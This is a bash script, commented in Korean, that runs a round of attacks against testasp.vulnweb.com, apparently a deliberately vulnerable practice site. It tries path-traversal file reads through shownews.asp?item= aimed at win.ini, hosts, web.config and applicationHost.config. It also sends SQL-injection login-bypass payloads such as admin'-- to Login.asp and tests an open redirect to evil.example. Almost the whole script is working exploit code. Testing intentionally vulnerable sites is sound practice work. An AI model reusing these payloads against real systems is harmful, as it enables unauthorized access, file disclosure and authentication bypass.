#!/usr/bin/env bash
# Round 5 — shownews.asp?item= 두 번째 파일 읽기 프리미티브 검증 + Login.asp SQLi/오픈리다이렉트
set -u
BASE="http://testasp.vulnweb.com"
D="$(cd "$(dirname "$0")" && pwd)"; OUT="$D/out"; mkdir -p "$OUT"
CURL=(curl -s --noproxy '*' --max-time 25)

echo "### E. shownews.asp?item= — HTML 인코딩된 파일 읽기 (두 번째 프리미티브)"
printf "%-22s %-52s %s %s\n" LABEL PATH "CODE" "SIZE"
sn() { printf "%-22s %-52s " "$1" "$2"
  "${CURL[@]}" -o "$OUT/sn_$1.html" -w "%{http_code} %{size_download}\n" \
    "$BASE/shownews.asp?item=$2"; }
sn about_html      "html/about.html"
sn db_asp          "db.asp"
sn web_config      "web.config"
sn templatize_src  "Templatize.asp"
sn win_ini_x4      "..%2f..%2f..%2f..%2fwindows%2fwin.ini"
sn hosts_x4        "..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts"
sn loginput_txt_x4 "..%2f..%2f..%2f..%2fscripts%2flogInput.txt"
sn apphost_x4      "..%2f..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config"
sn apphost_x5      "..%2f..%2f..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config"
sn backslash_enc   "..%5c..%5c..%5c..%5cwindows%5cwin.ini"
echo
echo "--- shownews.asp?item=db.asp 본문(발췌) ---"
python3 - <<'EOF'
import re,html
s=open("out/sn_db_asp.html",encoding="latin-1",errors="replace").read()
i=s.find("MainContentLeft")
seg=s[i:i+1500]
print(html.unescape(seg)[:900])
EOF
echo
echo "### F. login.asp — SQLi 인증 우회 + RetURL 오픈 리다이렉트 (POST, DB 변경 없음)"
for name_payload in "bypass_pw:tfUName=admin'--&tfUPass=x" \
                    "bypass_or:tfUName=x' OR '1'='1'--&tfUPass=x" \
                    "normal_fail:tfUName=admin&tfUPass=wrongpass"; do
  label="${name_payload%%:*}"; data="${name_payload#*:}"
  printf "%-14s " "$label"
  "${CURL[@]}" -c "$OUT/jar_$label.txt" -D "$OUT/hdr_$label.txt" -o "$OUT/login_$label.html" \
    -w "code=%{http_code} redirect=%{redirect_url}\n" \
    -X POST --data "$data" "$BASE/Login.asp"
  grep -i '^location:' "$OUT/hdr_$label.txt" | tr -d '\r' | sed 's/^/               /'
  printf "               logout 마커: "
  grep -o 'logout [^<]*' "$OUT/login_$label.html" | head -1
  printf "               showforum 접근: "
  "${CURL[@]}" -b "$OUT/jar_$label.txt" -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/showforum.asp?id=1"
done
echo
echo "### G. 오픈 리다이렉트 (RetURL)"
for r in "http%3A%2F%2Fexample.com%2F" "https%3A%2F%2Fevil.example%2Fp" "%2F%2Fexample.com%2F"; do
  printf "RetURL=%-30s " "$r"
  "${CURL[@]}" -D - -o /dev/null -X POST \
    --data "tfUName=admin'--&tfUPass=x" \
    "$BASE/Login.asp?RetURL=$r" | grep -i '^location:' | tr -d '\r'
done
